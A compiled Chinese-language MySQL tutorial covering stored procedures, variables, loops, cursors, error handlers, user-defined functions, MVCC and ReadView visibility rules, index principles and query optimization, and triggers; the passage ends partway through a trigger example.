**换行写法：OUT 参数**
`OUT <参数名> <类型>`
```sql
-- 创建带 OUT 输出参数的存储过程
DELIMITER //
CREATE PROCEDURE GetUserCount(OUT p_count INT)
BEGIN
    SELECT COUNT(*) INTO p_count FROM users;
END //
DELIMITER ;
```

**换行写法：INOUT 参数**
`INOUT <参数名> <类型>`
```sql
-- 创建带 INOUT 输入输出参数的存储过程
DELIMITER //
CREATE PROCEDURE DoubleValue(INOUT p_value INT)
BEGIN
    SET p_value = p_value * 2;
END //
DELIMITER ;
```

---

## 变量声明

**单行写法：声明局部变量**
`DECLARE <变量名> <类型> [DEFAULT <默认值>]`
```sql
-- 声明带默认值的局部变量
DECLARE v_name VARCHAR(100) DEFAULT 'Unknown';
```

**单行写法：SELECT INTO 赋值**
`SELECT <列名> INTO <变量名> FROM <表名> WHERE <条件>`
```sql
-- 查询结果赋值给变量
SELECT COUNT(*) INTO v_count FROM users;
```

**单行写法：SET 变量赋值**
`SET <变量名> = <值>`
```sql
-- 为局部变量赋值
SET v_total = v_count * 9.99;
```

**单行写法：设置用户变量**
`SET @<变量名> = <值>`
```sql
-- 设置会话级别的用户变量
SET @user_var = 'Hello';
```

---

## 条件判断

**换行写法：IF 多分支**
`IF <条件> THEN <语句> [ELSEIF <条件> THEN <语句>] [ELSE <语句>] END IF`
```sql
-- 根据金额计算折扣率
DELIMITER //
CREATE PROCEDURE GetDiscount(IN p_amount DECIMAL(10, 2))
BEGIN
    DECLARE v_discount DECIMAL(4, 2);

    IF p_amount >= 1000 THEN
        SET v_discount = 0.20;
    ELSEIF p_amount >= 500 THEN
        SET v_discount = 0.10;
    ELSEIF p_amount >= 100 THEN
        SET v_discount = 0.05;
    ELSE
        SET v_discount = 0.00;
    END IF;

    SELECT p_amount AS original,
           p_amount * (1 - v_discount) AS discounted,
           v_discount AS discount_rate;
END //
DELIMITER ;
```

**换行写法：CASE 多分支**
`CASE <表达式> WHEN <值> THEN <语句> [WHEN ...] [ELSE <语句>] END CASE`
```sql
-- 根据地区计算运费
DELIMITER //
CREATE PROCEDURE GetShippingCost(IN p_region VARCHAR(50))
BEGIN
    DECLARE v_cost DECIMAL(10, 2);

    CASE p_region
        WHEN 'North' THEN SET v_cost = 10.00;
        WHEN 'South' THEN SET v_cost = 15.00;
        WHEN 'East' THEN SET v_cost = 12.00;
        WHEN 'West' THEN SET v_cost = 12.00;
        ELSE SET v_cost = 20.00;
    END CASE;

    SELECT v_cost AS shipping_cost;
END //
DELIMITER ;
```

---

## 循环

**换行写法：WHILE 循环**
`[<标签>:] WHILE <条件> DO <语句> END WHILE [<标签>]`
```sql
-- WHILE 循环生成数字串
DELIMITER //
CREATE PROCEDURE GenerateNumbers(IN p_count INT)
BEGIN
    DECLARE i INT DEFAULT 1;
    DECLARE result VARCHAR(1000) DEFAULT '';

    WHILE i <= p_count DO
        SET result = CONCAT(result, IF(i > 1, ',', ''), i);
        SET i = i + 1;
    END WHILE;

    SELECT result AS numbers;
END //
DELIMITER ;
```

**换行写法：REPEAT 循环**
`[<标签>:] REPEAT <语句> UNTIL <条件> END REPEAT [<标签>]`
```sql
-- REPEAT 循环至少执行一次
DELIMITER //
CREATE PROCEDURE RepeatDemo(IN p_limit INT)
BEGIN
    DECLARE i INT DEFAULT 1;
    DECLARE total INT DEFAULT 0;

    REPEAT
        SET total = total + i;
        SET i = i + 1;
    UNTIL i > p_limit
    END REPEAT;

    SELECT total AS sum_result;
END //
DELIMITER ;
```

**换行写法：LOOP 循环**
`[<标签>:] LOOP <语句> END LOOP [<标签>]`
```sql
-- LOOP 配合 LEAVE 跳出循环
DELIMITER //
CREATE PROCEDURE LoopDemo(IN p_limit INT)
BEGIN
    DECLARE i INT DEFAULT 0;
    DECLARE total INT DEFAULT 0;

    add_loop: LOOP
        SET i = i + 1;
        IF i > p_limit THEN
            LEAVE add_loop;
        END IF;
        SET total = total + i;
    END LOOP;

    SELECT total AS sum_result;
END //
DELIMITER ;
```

**单行写法：ITERATE 跳过当前循环**
`ITERATE <标签>`
```sql
-- ITERATE 跳过偶数只累加奇数
DELIMITER //
CREATE PROCEDURE OddSum(IN p_limit INT)
BEGIN
    DECLARE i INT DEFAULT 0;
    DECLARE total INT DEFAULT 0;

    odd_loop: LOOP
        SET i = i + 1;
        IF i > p_limit THEN
            LEAVE odd_loop;
        END IF;
        IF i % 2 = 0 THEN
            ITERATE odd_loop;
        END IF;
        SET total = total + i;
    END LOOP;

    SELECT total AS odd_sum;
END //
DELIMITER ;
```

---

## 游标

**换行写法：游标基本遍历**
`DECLARE <游标名> CURSOR FOR <SELECT 语句>`
```sql
-- 游标遍历用户并记录日志
DELIMITER //
CREATE PROCEDURE ProcessUsers()
BEGIN
    DECLARE v_done INT DEFAULT FALSE;
    DECLARE v_id INT;
    DECLARE v_username VARCHAR(50);
    DECLARE v_email VARCHAR(100);

    DECLARE cur CURSOR FOR
        SELECT id, username, email FROM users WHERE status = 'active';

    DECLARE CONTINUE HANDLER FOR NOT FOUND SET v_done = TRUE;

    OPEN cur;

    read_loop: LOOP
        FETCH cur INTO v_id, v_username, v_email;
        IF v_done THEN
            LEAVE read_loop;
        END IF;

        INSERT INTO user_log (user_id, action, created_at)
        VALUES (v_id, CONCAT('Processed user: ', v_username), NOW());
    END LOOP;

    CLOSE cur;

    SELECT 'Processing complete' AS status;
END //
DELIMITER ;
```

**换行写法：游标配合临时表**
`DECLARE <游标名> CURSOR FOR <聚合查询>`
```sql
-- 游标遍历聚合结果写入临时表
DELIMITER //
CREATE PROCEDURE CategoryStats()
BEGIN
    DECLARE v_done INT DEFAULT FALSE;
    DECLARE v_category VARCHAR(50);
    DECLARE v_count INT;
    DECLARE v_avg_price DECIMAL(10, 2);

    DECLARE cur CURSOR FOR
        SELECT category, COUNT(*) AS cnt, AVG(price) AS avg_price
        FROM products
        GROUP BY category;

    DECLARE CONTINUE HANDLER FOR NOT FOUND SET v_done = TRUE;

    DROP TEMPORARY TABLE IF EXISTS temp_stats;
    CREATE TEMPORARY TABLE temp_stats (
        category VARCHAR(50),
        product_count INT,
        avg_price DECIMAL(10, 2)
    );

    OPEN cur;

    read_loop: LOOP
        FETCH cur INTO v_category, v_count, v_avg_price;
        IF v_done THEN
            LEAVE read_loop;
        END IF;

        INSERT INTO temp_stats VALUES (v_category, v_count, v_avg_price);
    END LOOP;

    CLOSE cur;

    SELECT * FROM temp_stats;
    DROP TEMPORARY TABLE IF EXISTS temp_stats;
END //
DELIMITER ;
```

---

## 异常处理

**换行写法：CONTINUE HANDLER**
`DECLARE CONTINUE HANDLER FOR <异常> BEGIN <处理> END`
```sql
-- 捕获异常后继续执行
DELIMITER //
CREATE PROCEDURE SafeInsertUser(
    IN p_username VARCHAR(50),
    IN p_email VARCHAR(100)
)
BEGIN
    DECLARE v_error VARCHAR(255) DEFAULT '';

    DECLARE CONTINUE HANDLER FOR SQLEXCEPTION
    BEGIN
        GET DIAGNOSTICS CONDITION 1 v_error = MESSAGE_TEXT;
        SELECT CONCAT('Error: ', v_error) AS error_message;
    END;

    INSERT INTO users (username, email, created_at)
    VALUES (p_username, p_email, NOW());

    IF v_error = '' THEN
        SELECT 'User inserted successfully' AS result;
    END IF;
END //
DELIMITER ;
```

**换行写法：EXIT HANDLER**
`DECLARE EXIT HANDLER FOR <异常> BEGIN <处理> END`
```sql
-- 捕获异常后退出并回滚
DELIMITER //
CREATE PROCEDURE SafeTransfer(
    IN p_from_id INT,
    IN p_to_id INT,
    IN p_amount DECIMAL(10, 2)
)
BEGIN
    DECLARE EXIT HANDLER FOR SQLEXCEPTION
    BEGIN
        ROLLBACK;
        SELECT 'Transfer failed, transaction rolled back' AS result;
    END;

    START TRANSACTION;

    UPDATE accounts SET balance = balance - p_amount WHERE id = p_from_id;
    UPDATE accounts SET balance = balance + p_amount WHERE id = p_to_id;

    COMMIT;
    SELECT 'Transfer completed' AS result;
END //
DELIMITER ;
```

---

## 自定义函数

**换行写法：创建函数**
`CREATE FUNCTION <函数名>([<参数>]) RETURNS <返回类型> [DETERMINISTIC] BEGIN <函数体> RETURN <值> END`
```sql
-- 计算订单总金额的函数
DELIMITER //
CREATE FUNCTION CalculateOrderTotal(p_order_id INT)
RETURNS DECIMAL(12, 2)
DETERMINISTIC
READS SQL DATA
BEGIN
    DECLARE v_total DECIMAL(12, 2);

    SELECT SUM(oi.quantity * oi.unit_price)
    INTO v_total
    FROM order_items oi
    WHERE oi.order_id = p_order_id;

    RETURN IFNULL(v_total, 0);
END //
DELIMITER ;
```

**换行写法：创建格式化函数**
`CREATE FUNCTION <函数名>(<参数>) RETURNS <返回类型> BEGIN RETURN <表达式> END`
```sql
-- 格式化金额显示的函数
DELIMITER //
CREATE FUNCTION FormatCurrency(
    p_amount DECIMAL(12, 2),
    p_currency VARCHAR(3)
)
RETURNS VARCHAR(20)
DETERMINISTIC
BEGIN
    RETURN CONCAT(p_currency, ' ', FORMAT(p_amount, 2));
END //
DELIMITER ;
```

**单行写法：调用函数**
`SELECT <函数名>(<参数>)`
```sql
-- 使用自定义函数查询
SELECT CalculateOrderTotal(1001) AS total;
```

**单行写法：在查询中使用函数**
`SELECT <列名>, <函数名>(<列名>) AS <别名> FROM <表名>`
```sql
-- 在 SELECT 中使用函数计算年龄
SELECT name, CalculateAge(birthdate) AS age FROM employees;
```

---

## DELIMITER 使用

**单行写法：修改分隔符**
`DELIMITER <分隔符>`
```sql
-- 临时更改语句分隔符
DELIMITER //
```

**换行写法：DELIMITER 完整用法**
`DELIMITER <分隔符> <创建语句> <分隔符> DELIMITER ;`
```sql
-- 使用 DELIMITER 创建存储过程
DELIMITER //
CREATE PROCEDURE MyProc()
BEGIN
    SELECT * FROM users;
END //
DELIMITER ;
```

<!-- ============ 文档分隔线：020-mysql/064-MVCCSnapshotCurrentRead.md ============ -->

## 1. MVCC 基础概念

### 1.1 什么是 MVCC

MVCC（Multi-Version Concurrency Control，多版本并发控制）是 InnoDB 实现高并发读写的核心机制。其核心思想是：**读不阻塞写，写不阻塞读**。

```
传统锁机制：读 → 加共享锁 → 阻塞写
MVCC机制：  读 → 访问历史版本 → 不阻塞写
```

### 1.2 MVCC 的核心组件

| 组件            | 作用                                             |
| --------------- | ------------------------------------------------ |
| 隐藏列          | `DB_TRX_ID`（事务ID）、`DB_ROLL_PTR`（回滚指针） |
| Undo Log 版本链 | 通过 `DB_ROLL_PTR` 串联的历史版本                |
| ReadView        | 决定当前事务能看到哪个版本                       |

### 1.3 隐藏列结构

每行数据包含两个隐藏列：

```mermaid
flowchart LR
    D[数据列 用户数据] --- T[DB_TRX_ID 6字节<br/>最后修改该行的事务ID]
    T --- R[DB_ROLL_PTR 7字节<br/>指向 Undo Log 中该行的上一个版本]
    R --- W[DB_ROW_ID 6字节<br/>隐藏自增ID 无主键时自动生成]
```

## 2. Undo Log 版本链

### 2.1 版本链构建

当一行数据被多次修改时，每次修改前的旧版本通过 `DB_ROLL_PTR` 串联成链表：

```
当前行: {data='C', trx_id=303, roll_ptr→undo_C}
                                         ↓
Undo版本: {data='B', trx_id=202, roll_ptr→undo_B}
                                         ↓
Undo版本: {data='A', trx_id=101, roll_ptr→NULL}
```

### 2.2 版本链遍历

当事务需要读取数据时，从当前行开始沿版本链向前遍历，找到第一个对当前事务可见的版本。

## 3. ReadView 机制

### 3.1 ReadView 结构

ReadView 是事务进行快照读时创建的"可见性判断规则"，包含四个关键字段：

```
ReadView {
    m_ids:        [201, 302]          -- 创建时所有活跃（未提交）事务ID列表
    min_trx_id:   201                 -- m_ids 中的最小值
    max_trx_id:   401                 -- 下一个将分配的事务ID（当前最大事务ID+1）
    creator_trx_id: 303               -- 创建该 ReadView 的事务ID
}
```

### 3.2 可见性判断规则

对于版本链中某个版本的 `trx_id`：

```
1. trx_id == creator_trx_id → 可见（自己修改的）
2. trx_id < min_trx_id      → 可见（该事务在 ReadView 创建前已提交）
3. trx_id >= max_trx_id     → 不可见（该事务在 ReadView 创建后才开始）
4. min_trx_id <= trx_id < max_trx_id:
   - trx_id 在 m_ids 中 → 不可见（该事务未提交）
   - trx_id 不在 m_ids 中 → 可见（该事务已提交）
```

### 3.3 可见性判断流程图

```
                    trx_id == creator_trx_id?
                    /                    \
                  YES                    NO
                  ↓                       ↓
               可见              trx_id < min_trx_id?
                                /                \
                              YES                NO
                              ↓                  ↓
                            可见        trx_id >= max_trx_id?
                                      /                \
                                    YES                NO
                                    ↓                  ↓
                                 不可见       trx_id ∈ m_ids?
                                            /          \
                                          YES          NO
                                          ↓            ↓
                                        不可见        可见
```

## 4. 快照读与当前读

### 4.1 快照读（Snapshot Read）

快照读读取的是数据的**历史版本**，不加锁，通过 MVCC 实现：

```sql
-- 普通 SELECT 都是快照读
SELECT * FROM users WHERE id = 1;
```

**RC 隔离级别**：每次 SELECT 都创建新的 ReadView

```
事务A (trx_id=300):
  SELECT * FROM users WHERE id=1;  -- 创建 ReadView_1
  -- 此时事务B修改了 id=1 并提交
  SELECT * FROM users WHERE id=1;  -- 创建 ReadView_2，能看到事务B的修改
```

**RR 隔离级别**：只在第一次 SELECT 时创建 ReadView，后续复用

```
事务A (trx_id=300):
  SELECT * FROM users WHERE id=1;  -- 创建 ReadView_1
  -- 此时事务B修改了 id=1 并提交
  SELECT * FROM users WHERE id=1;  -- 复用 ReadView_1，看不到事务B的修改
```

### 4.2 当前读（Current Read）

当前读读取的是数据的**最新版本**，并加锁：

```sql
-- 当前读语句
SELECT * FROM users WHERE id = 1 FOR UPDATE;      -- 排他锁
SELECT * FROM users WHERE id = 1 LOCK IN SHARE MODE; -- 共享锁
UPDATE users SET name = 'new' WHERE id = 1;        -- 排他锁
DELETE FROM users WHERE id = 1;                     -- 排他锁
INSERT INTO users VALUES (1, 'new');                -- 插入锁
```

### 4.3 快照读与当前读对比

| 维度     | 快照读      | 当前读           |
| -------- | ----------- | ---------------- |
| 读取版本 | 历史版本    | 最新版本         |
| 加锁     | 不加锁      | 加行锁/间隙锁    |
| ReadView | 创建/复用   | 不使用           |
| 语句     | 普通 SELECT | FOR UPDATE / DML |
| 一致性   | 一致性视图  | 实时数据         |

### 4.4 快照读与当前读混合的陷阱

```sql
-- RR 隔离级别下的经典问题
BEGIN;
-- 快照读：读取 stock=10
SELECT stock FROM products WHERE id=1;  -- stock=10

-- 当前读：读取最新 stock
SELECT stock FROM products WHERE id=1 FOR UPDATE;  -- stock=8（已被其他事务修改）

-- 快照读：仍然读取旧值
SELECT stock FROM products WHERE id=1;  -- stock=10（ReadView 未更新）

-- UPDATE 是当前读，基于最新版本
UPDATE products SET stock = stock - 1 WHERE id=1;  -- 基于 stock=8

COMMIT;
```

## 5. 不同隔离级别的 MVCC 行为

### 5.1 READ UNCOMMITTED

不使用 MVCC，直接读取最新数据（可能读到未提交数据）。

### 5.2 READ COMMITTED

每次 SELECT 创建新 ReadView：

```
时间线:  T1        T2        T3        T4
事务A:   BEGIN     SELECT→RV1           SELECT→RV2
事务B:             BEGIN     UPDATE    COMMIT

T2: SELECT 创建 RV1，看到事务B修改前的数据
T4: SELECT 创建 RV2，看到事务B已提交的修改
```

### 5.3 REPEATABLE READ

只在第一次 SELECT 创建 ReadView，后续复用：

```
时间线:  T1        T2        T3        T4
事务A:   BEGIN     SELECT→RV1           SELECT(复用RV1)
事务B:             BEGIN     UPDATE    COMMIT

T2: SELECT 创建 RV1
T4: SELECT 复用 RV1，仍然看到事务B修改前的数据
```

### 5.4 SERIALIZABLE

所有 SELECT 自动加共享锁，退化为当前读，不存在快照读。

<!-- ============ 文档分隔线：020-mysql/065-IndexPrinciplePerformanceOptimization.md ============ -->

## 1. 索引原理 (Index Mechanism)

### 1.1 什么是索引

索引是帮助数据库高效获取数据的数据结构，它可以大大减少数据库在查询过程中需要扫描的数据量，从而提高查询性能。

### 1.2 B+ 树索引原理

MySQL (InnoDB) 默认使用的索引结构是 B+ 树，它是一种平衡树结构，具有以下特点：

- **非叶子节点**：仅存储键值，不存储数据
- **叶子节点**：存储键值和对应的数据（聚簇索引）或主键值（非聚簇索引）
- **双向链表**：叶子节点之间通过双向链表相连，适合范围查询
- **高度平衡**：树的高度较低，通常为 3-4 层，查询效率高

### 1.3 B+ 树 vs B 树

- **B 树**：非叶子节点也存储数据，节点大小固定，范围查询需要回溯
- **B+ 树**：只有叶子节点存储数据，叶子节点通过链表相连，范围查询更高效

## 2. 索引分类 (Classification)

### 2.1 按功能分类

- **主键索引 (Primary Key)**：唯一且非空，InnoDB 会自动为表创建聚簇索引
- **唯一索引 (Unique)**：唯一但可为空，确保列值唯一性
- **普通索引 (Normal)**：加快查询速度，无唯一性约束
- **组合索引 (Composite)**：多个字段组成的索引，遵循最左前缀法则
- **全文索引 (Fulltext)**：用于全文搜索，支持关键词匹配
- **空间索引 (Spatial)**：用于地理空间数据类型

### 2.2 按物理存储分类

- **聚簇索引 (Clustered Index)**：数据与索引存储在一起，叶子节点存储完整的行数据
- **非聚簇索引 (Non-Clustered Index)**：数据与索引分开存储，叶子节点存储主键值

## 3. 聚簇索引 vs. 非聚簇索引 (Clustered vs Non-Clustered)

### 3.1 聚簇索引

- **特点**：数据与主键索引存储在一起，叶子节点即为行数据
- **优势**：查询效率高，特别是通过主键查询时
- **劣势**：插入速度较慢，因为需要维护索引顺序
- **适用场景**：主键查询频繁的表

### 3.2 非聚簇索引

- **特点**：叶子节点存储的是主键值，需要通过主键值回表查询完整数据
- **优势**：插入速度较快，索引维护成本低
- **劣势**：查询时可能需要回表，性能略差
- **适用场景**：插入频繁的表

### 3.3 回表查询

当使用非聚簇索引查询时，MySQL 会先通过索引找到主键值，然后再通过主键索引找到完整的行数据，这个过程称为回表查询。

## 4. 索引的创建与管理

### 4.1 创建索引

#### 4.1.1 创建表时创建索引

```sql
 CREATE TABLE users (
  id INT PRIMARY KEY,
  name VARCHAR(50),
  email VARCHAR(100) UNIQUE,
  age INT,
  INDEX idx_age (age),
  INDEX idx_name_age (name, age)
 )
```

#### 4.1.2 为现有表添加索引

```sql
 CREATE INDEX idx_age ON users(age);
 CREATE UNIQUE INDEX idx_email ON users(email);
 CREATE INDEX idx_name_age ON users(name, age);
 CREATE FULLTEXT INDEX idx_content ON articles(content);
```

### 4.2 修改索引

```sql
 ALTER TABLE users RENAME INDEX idx_age TO idx_user_age;
```

### 4.3 删除索引

```sql
 DROP INDEX idx_age ON users;
 ALTER TABLE users DROP INDEX idx_age;
```

### 4.4 查看索引

```sql
 SHOW INDEX FROM users;
 SELECT * FROM INFORMATION_SCHEMA.STATISTICS WHERE table_schema = 'database_name' AND table_name = 'users';
```

## 5. 查询优化 (Optimization)

### 5.1 `EXPLAIN` 执行计划详解

#### 5.1.1 基本用法

```sql
 EXPLAIN SELECT * FROM users WHERE age > 18;
```

#### 5.1.2 执行计划字段含义

- **`id`**: 查询的ID，用于标识不同的查询部分
- **`select_type`**: 查询类型（SIMPLE, PRIMARY, SUBQUERY, DERIVED, UNION, UNION RESULT）
- **`table`**: 表名
- **`partitions`**: 匹配的分区
- **`type`**: 访问类型（从快到慢）：
- `system`: 表只有一行数据
- `const`: 使用主键或唯一索引查询
- `eq_ref`: 多表连接时使用主键或唯一索引
- `ref`: 使用普通索引查询
- `range`: 范围查询
- `index`: 扫描整个索引
- `ALL`: 全表扫描
- **`possible_keys`**: 可能使用的索引
- **`key`**: 实际使用的索引
- **`key_len`**: 使用的索引长度
- **`ref`**: 索引引用的列或常量
- **`rows`**: 预计扫描的行数
- **`filtered`**: 过滤后的行数百分比
- **`Extra`**: 额外信息
- `Using index`: 使用覆盖索引
- `Using where`: 使用 WHERE 子句过滤
- `Using temporary`: 使用临时表
- `Using filesort`: 使用文件排序
- `Using join buffer`: 使用连接缓冲区

### 5.2 慢查询日志 (Slow Query Log)

#### 5.2.1 开启慢查询日志

```sql
 SHOW VARIABLES LIKE '%slow_query%';
 SET GLOBAL slow_query_log = 'ON';
 SET GLOBAL long_query_time = 1;
 SET GLOBAL slow_query_log_file = '/var/lib/mysql/slow-query.log';
 SET GLOBAL log_queries_not_using_indexes = 'ON';
```

#### 5.2.2 分析慢查询日志

```bash
 mysqldumpslow -s t /var/lib/mysql/slow-query.log
 mysqldumpslow -s c /var/lib/mysql/slow-query.log
 mysqldumpslow -s r /var/lib/mysql/slow-query.log
```

### 5.3 索引使用技巧

#### 5.3.1 最左前缀法则

对于组合索引 `(a, b, c)`，以下查询会使用索引：

- `WHERE a = 1`
- `WHERE a = 1 AND b = 2`
- `WHERE a = 1 AND b = 2 AND c = 3`
  以下查询不会使用索引：
- `WHERE b = 2`
- `WHERE c = 3`
- `WHERE b = 2 AND c = 3`

#### 5.3.2 索引失效的情况

- **使用函数**：`WHERE DATE(create_time) = '2023-01-01'`
- **类型转换**：`WHERE age = '18'`（字符串与数字比较）
- **使用 LIKE 前缀通配符**：`WHERE name LIKE '%John'`
- **使用 OR**：`WHERE age = 18 OR name = 'John'`（除非所有列都有索引）
- **使用 NOT IN**：`WHERE age NOT IN (18, 20)`
- **使用 != 或 <>**：`WHERE age != 18`
- **使用 IS NULL**：`WHERE age IS NULL`（除非索引包含 NULL 值）

#### 5.3.3 覆盖索引

当查询的列都包含在索引中时，MySQL 不需要回表查询，直接从索引中获取数据，提高查询效率。

```sql
 SELECT name, age FROM users WHERE name = 'John';
 SELECT id, name, age FROM users WHERE name = 'John';
```

## 6. 性能优化策略

### 6.1 查询优化

- **避免 SELECT \***：只查询需要的列
- **使用 LIMIT**：限制返回行数
- **合理使用 JOIN**：避免过多的表连接
- **使用子查询或临时表**：对于复杂查询
- **优化 ORDER BY**：尽量使用索引排序
- **使用 GROUP BY**：注意分组字段的索引

### 6.2 索引优化

- **选择合适的索引类型**：根据查询场景选择
- **合理设计组合索引**：遵循最左前缀法则
- **定期重建索引**：避免索引碎片
- **删除不必要的索引**：减少维护成本
- **使用前缀索引**：对于长字符串列

### 6.3 表结构优化

- **选择合适的数据类型**：使用最小的必要数据类型
- **避免使用 NULL**：NULL 值会增加存储和查询成本
- **使用合适的字符集**：如 UTF-8mb4
- **分区表**：对于大表，使用分区提高查询效率
- **分表**：水平分表或垂直分表

### 6.4 服务器配置优化

- **调整缓冲池大小**：`innodb_buffer_pool_size`
- **调整查询缓存**：`query_cache_size`
- **调整连接数**：`max_connections`
- **调整日志配置**：`innodb_log_file_size`
- **调整排序缓冲区**：`sort_buffer_size`
- **调整临时表大小**：`tmp_table_size`

## 7. 实际案例分析

### 7.1 案例 1：慢查询优化

**问题**：执行以下查询时速度很慢

```sql
 SELECT * FROM orders WHERE create_time > '2023-01-01' AND status = 'completed';
```

**分析**：

1. 使用 EXPLAIN 查看执行计划
2. 发现 type 为 ALL，进行了全表扫描
3. 检查索引，发现 create_time 和 status 列都没有索引
   **解决方案**：
4. 创建组合索引

```sql
 CREATE INDEX idx_create_time_status ON orders(create_time, status);
```

1. 优化查询，只查询需要的列

```sql
 SELECT id, user_id, amount FROM orders WHERE create_time > '2023-01-01' AND status = 'completed';
```

### 7.2 案例 2：索引失效

**问题**：使用了索引但查询仍然很慢

```sql
 SELECT * FROM users WHERE YEAR(birthday) = 1990;
```

**分析**：

1. 虽然 birthday 列有索引，但使用了 YEAR() 函数，导致索引失效
2. 执行计划显示 type 为 ALL，进行了全表扫描
   **解决方案**：
3. 重写查询，避免使用函数

```sql
 SELECT * FROM users WHERE birthday BETWEEN '1990-01-01' AND '1990-12-31';
```

1. 或者创建函数索引（MySQL 8.0+）

```sql
 CREATE INDEX idx_year_birthday ON users((YEAR(birthday)));
```

### 7.3 案例 3：组合索引优化

**问题**：有组合索引 `idx_name_age (name, age)`，但以下查询没有使用索引

```sql
 SELECT * FROM users WHERE age = 18;
```

**分析**：

1. 组合索引遵循最左前缀法则
2. 查询条件只使用了 age 列，没有使用 name 列，所以索引失效
   **解决方案**：
3. 创建单独的 age 索引

```sql
 CREATE INDEX idx_age ON users(age);
```

1. 或者调整查询，包含 name 列

```sql
 SELECT * FROM users WHERE name = 'John' AND age = 18;
```

## 8. 性能监控与工具

### 8.1 内置工具

- **SHOW STATUS**：查看服务器状态
- **SHOW VARIABLES**：查看服务器配置
- **SHOW PROCESSLIST**：查看当前连接和查询
- **INFORMATION_SCHEMA**：查询元数据
- **PERFORMANCE_SCHEMA**：性能监控

### 8.2 第三方工具

- **MySQL Workbench**：图形化管理工具
- **phpMyAdmin**：Web 管理工具
- **Percona Monitoring and Management (PMM)**：性能监控
- **MySQLTuner**：配置优化建议
- **pt-query-digest**：慢查询分析

## 9. 最佳实践

### 9.1 索引设计最佳实践

- **为常用查询创建索引**：分析查询模式
- **选择高选择性的列**：区分度高的列适合作为索引
- **控制索引数量**：每个表的索引数量不宜过多
- **定期维护索引**：使用 `OPTIMIZE TABLE` 重建索引
- **使用前缀索引**：对于长字符串列

### 9.2 查询优化最佳实践

- **避免全表扫描**：尽量使用索引
- **合理使用 JOIN**：控制连接表的数量
- **使用 EXPLAIN**：分析查询计划
- **优化子查询**：考虑使用 JOIN 替代子查询
- **使用 LIMIT**：限制返回行数

### 9.3 表结构设计最佳实践

- **选择合适的数据类型**：使用最小的必要数据类型
- **避免使用 TEXT/BLOB**：除非必要
- **使用 AUTO_INCREMENT**：主键使用自增整数
- **合理设计表结构**：避免过度规范化或反规范化

## 10. 常见问题与解决方案

### 10.1 索引不生效

**问题**：创建了索引但查询没有使用
**解决方案**：

- 检查查询条件是否符合索引使用规则
- 检查索引是否被正确创建
- 使用 EXPLAIN 分析执行计划
- 考虑重建索引

### 10.2 慢查询

**问题**：查询执行时间过长
**解决方案**：

- 开启慢查询日志
- 分析慢查询日志
- 创建合适的索引
- 优化查询语句
- 考虑表结构优化

### 10.3 索引膨胀

**问题**：索引占用空间过大
**解决方案**：

- 删除不必要的索引
- 优化索引设计
- 定期重建索引
- 考虑使用前缀索引

### 10.4 死锁

**问题**：并发操作时出现死锁
**解决方案**：

- 优化事务设计
- 减少事务持有时间
- 统一锁定顺序
- 使用合理的隔离级别

## 11. 总结

索引是 MySQL 性能优化的关键因素，正确使用索引可以显著提高查询效率。通过理解 B+ 树索引原理、掌握索引分类和使用方法、分析执行计划、优化慢查询，以及遵循最佳实践，可以有效地提升 MySQL 数据库的性能。

### 核心要点

- **索引原理**：B+ 树结构，聚簇索引与非聚簇索引
- **索引类型**：主键索引、唯一索引、普通索引、组合索引、全文索引
- **索引使用**：最左前缀法则，避免索引失效
- **查询优化**：使用 EXPLAIN 分析执行计划，优化慢查询
- **性能调优**：服务器配置优化，表结构优化

### 学习建议

- **实践**：通过实际操作熟悉索引的创建和使用
- **分析**：使用 EXPLAIN 分析查询计划
- **监控**：开启慢查询日志，监控数据库性能
- **优化**：根据实际情况调整索引和查询
- **持续学习**：关注 MySQL 的新特性和优化技巧

<!-- ============ 文档分隔线：020-mysql/066-TriggerEvent.md ============ -->

## 1. 触发器基础

### 1.1 什么是触发器

触发器是与表关联的数据库对象，在特定事件（INSERT、UPDATE、DELETE）发生时自动执行。

**触发器类型**：

| 触发时机 | 事件   | 说明       |
| :------- | :----- | :--------- |
| BEFORE   | INSERT | 插入前触发 |
| AFTER    | INSERT | 插入后触发 |
| BEFORE   | UPDATE | 更新前触发 |
| AFTER    | UPDATE | 更新后触发 |
| BEFORE   | DELETE | 删除前触发 |
| AFTER    | DELETE | 删除后触发 |

### 1.2 创建触发器

```sql
-- 基本语法
CREATE TRIGGER trigger_name
{BEFORE | AFTER} {INSERT | UPDATE | DELETE}
ON table_name
FOR EACH ROW
BEGIN
    -- 触发器逻辑
END;

-- 示例：插入用户后记录日志
DELIMITER //

CREATE TRIGGER after_user_insert
AFTER INSERT ON users
FOR EACH ROW
BEGIN
    INSERT INTO user_audit_log (user_id, action, action_time, details)
    VALUES (NEW.id, 'INSERT', NOW(), CONCAT('Created user: ', NEW.username));
END //

DELIMITER ;
```

### 1.3 NEW 和 OLD 关键字

```sql
-- NEW: 新数据（INSERT/UPDATE可用）
-- OLD: 旧数据（UPDATE/DELETE可用）

-- INSERT: 只有NEW
-- UPDATE: 有NEW和OLD
-- DELETE: 只有OLD

DELIMITER //

-- 记录用户信息变更
CREATE TRIGGER before_user_update
BEFORE UPDATE ON users
FOR EACH ROW
BEGIN
    -- 检查用户名是否变更
    IF OLD.username != NEW.username THEN
        INSERT INTO user_change_log (user_id, field_name, old_value, new_value, changed_at)
        VALUES (OLD.id, 'username', OLD.username, NEW.username, NOW());
    END IF;

    -- 检查邮箱是否变更
    IF OLD.email != NEW.email THEN
        INSERT INTO user_change_log (user_id, field_name, old_value, new_value, changed_at)
        VALUES (OLD.id, 'email', OLD.email, NEW.email, NOW());
    END IF;
END //

DELIMITER ;
```

## 2. BEFORE 触发器

### 2.1 数据验证

```sql
DELIMITER //

-- 验证员工薪资不能低于最低标准
CREATE TRIGGER before_salary_update
BEFORE UPDATE ON employees
FOR EACH ROW
BEGIN
    IF NEW.salary < 3000 THEN
        SIGNAL SQLSTATE '45000'
        SET MESSAGE_TEXT = '薪资不能低于最低标准3000元';
    END IF;
END //

-- 验证订单金额
CREATE TRIGGER before_order_insert
BEFORE INSERT ON orders
FOR EACH ROW
BEGIN
    IF NEW.total_amount <= 0 THEN
        SIGNAL SQLSTATE '45000'
        SET MESSAGE_TEXT = '订单金额必须大于0';
    END IF;

    -- 自动设置订单日期
    IF NEW.order_date IS NULL THEN
        SET NEW.order_date = CURDATE();
    END IF;
END //

DELIMITER ;
```

### 2.2 数据自动填充

```sql
DELIMITER //

-- 自动计算商品总价
CREATE TRIGGER before_order_item_insert
BEFORE INSERT ON order_items
FOR EACH ROW
BEGIN
    SET NEW.line_total = NEW.quantity * NEW.unit_price;
END //

-- 自动更新修改时间
CREATE TRIGGER before_product_update
BEFORE UPDATE ON products
FOR EACH ROW
